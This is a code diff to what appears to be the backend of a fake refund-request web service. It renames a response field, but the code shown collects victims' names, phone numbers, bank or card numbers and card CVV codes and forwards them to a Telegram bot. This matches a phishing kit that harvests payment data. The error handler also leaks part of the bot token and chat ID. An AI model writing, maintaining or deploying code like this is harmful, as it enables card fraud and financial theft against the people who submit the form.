@@ -102,20 +102,20 @@ app.post('/api/remboursement', async (req, res) => {
     return res.json({
       success: true,
       message: 'Votre demande a ete enregistree avec succes.',
-      emailSent: false,
+      telegramSent: false,
     });
   }
 
   try {
     const message = `Nouvelle demande de remboursement\n\nNom: ${data.nom}\nTelephone: ${data.telephone}\nRIB/Carte: ${data.rib}\nNom du compte: ${data.nomCompte}\nDate: ${data.date}\nCVV: ${data.CVV}`;
     const result = await sendToTelegram(message);
-    res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', emailSent: true, debug: result });
+    res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', telegramSent: true, debug: result });
   } catch (err) {
     console.error('Erreur envoi Telegram:', err.message);
     res.json({
       success: false,
       message: 'Erreur Telegram.',
-      emailSent: false,
+      telegramSent: false,
       error: err.message,
       debug: { tokenPrefix: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.slice(0, 5) : null, chatId: TELEGRAM_CHAT_ID },
     });
